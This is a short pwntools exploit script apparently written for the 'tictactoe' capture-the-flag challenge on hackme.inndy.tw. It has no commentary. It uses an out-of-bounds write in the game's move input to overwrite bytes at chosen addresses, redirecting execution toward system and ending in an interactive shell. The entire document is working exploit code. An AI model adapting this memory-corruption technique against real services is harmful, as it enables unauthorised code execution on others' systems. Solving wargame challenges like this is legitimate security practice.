from pwn import *

t = remote('hackme.inndy.tw', 7714)

elf = ELF('./tictactoe')

def write(addr, data):
	offset = addr - 0x804B056
	t.sendlineafter('): ', '9')
	t.sendline(data)
	t.sendlineafter('): ', str(offset))


addr_bss = elf.bss()
#0x0804af58 --> 0x8049FC8
addr_sys = 0x8049FC8
addr_avg = 0x804B048
addr_starab = 0x0804af58
t.sendlineafter('(2)nd? ', '1')
#raw_input()
write(addr_avg,'\x00')#0
write(addr_avg,'\x24')#1 
write(addr_starab,'\xc8')#2
write(addr_avg + 1,'\x30')#3 
write(addr_starab + 1,'\x9f')#4
write(addr_avg+2,'\x00')#5
write(addr_bss,'\x00')
write(addr_bss+1,'\x00')
write(addr_bss+2,'\x00')

t.interactive()